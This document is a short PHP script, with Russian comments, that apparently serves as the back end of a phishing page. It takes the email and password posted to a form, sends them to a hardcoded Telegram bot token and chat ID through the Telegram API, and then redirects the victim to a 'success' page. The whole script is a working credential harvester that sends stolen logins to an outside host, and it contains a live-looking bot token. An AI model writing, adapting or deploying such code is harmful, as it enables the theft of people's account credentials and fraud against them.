<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Ваши данные для Telegram
    $telegram_token = '7433120316:AAGDpLKMuRQz7eLuHlf-Rsd13Y3m9-qyLnw';  // Замените на ваш токен бота
    $telegram_chat_id = '278006495';  // Замените на ваш ID чата

    $telegram_message = "Логин: $email\nПароль: $password";

    $url = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($telegram_message);

    // Отправка запроса в Telegram API
    file_get_contents($url);

    // Перенаправление на страницу успеха
    header("Location: success.html");
    exit();
}
?>
